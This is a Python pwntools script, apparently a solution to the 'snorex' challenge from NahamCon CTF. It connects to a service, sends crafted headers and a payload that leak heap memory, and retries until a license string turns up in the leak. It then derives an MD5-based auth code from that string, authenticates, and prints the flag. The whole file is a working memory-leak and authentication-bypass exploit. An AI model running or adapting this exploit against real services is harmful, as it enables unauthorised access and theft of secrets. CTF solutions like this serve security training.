from pwn import *
import sys
import hashlib
import argparse

RESET_HEADER = p32(0, endian='big')
AUTH_HEADER = p32(1, endian='big')
IQ_HEADER = p32(6, endian='big')
IQ_PAYLOAD = b'\x28\x03\xff\xff'

def get_auth_code(encrypt_data: bytes) -> str:
    data = encrypt_data[8:].split(b'\x00', 1)[0][:256]
    return hashlib.md5(data).hexdigest()[:16]

def prepare(target):
    p = remote(target[0], int(target[1]), level='error')
    log.success('Preparing some stuff...')
    p.send(RESET_HEADER + p32(0))
    p.close()

def dump_heap(p):
    p.send(RESET_HEADER + p32(0))
    p.send(IQ_HEADER + p32(len(IQ_PAYLOAD), endian='big'))
    p.send(IQ_PAYLOAD)

    # https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/tubes/tube.py#L836
    with p.local(1):
        while True:
            if not p._fillbuffer():
                break

    return p.buffer.get()

def get_license(p):
    l = log.progress('Trying to get license')
    for i in range(1, 25):
        l.status('attemps ' + str(i))
        tmp = dump_heap(p)

        if b'SNOREX1' in tmp:
            l.success('success!')
            tmp = tmp[tmp.find(b'SNOREX1'):]
            parts = tmp.split(b'\x00', 2)
            lcns = parts[0] + b'\x00' + parts[1]
            return lcns
        else:
            continue

    l.failure('whoops! something went wrong...')
    sys.exit()

def get_flag(p, code):
    p.send(AUTH_HEADER + p32(len(code), endian='big'))
    p.send(code.encode())
    flag = p.read()[8:].decode('utf-8')
    return flag

def exploit(p):
    lcsn = get_license(p)
    code = get_auth_code(lcsn)
    log.success(f'Got auth code: {code}')
    flag = get_flag(p, code)
    log.success('Flag: ' + flag)

def main():
    parser = argparse.ArgumentParser(
            prog='exploit',
            description='exploit for snorex (NahamCon CTF)',
            usage='%(prog)s [ip:port]')
    parser.add_argument('target', default="127.0.0.1:3500", nargs='?',
                        help='target ip:port (default 127.0.0.1:3500)')
    args = parser.parse_args()

    if ':' in args.target:
        target = args.target.split(':')
        p = remote(target[0], int(target[1]))
        prepare(target)
        exploit(p)
    else:
        log.failure('invalid ip:port!')

if __name__ == '__main__':
    main()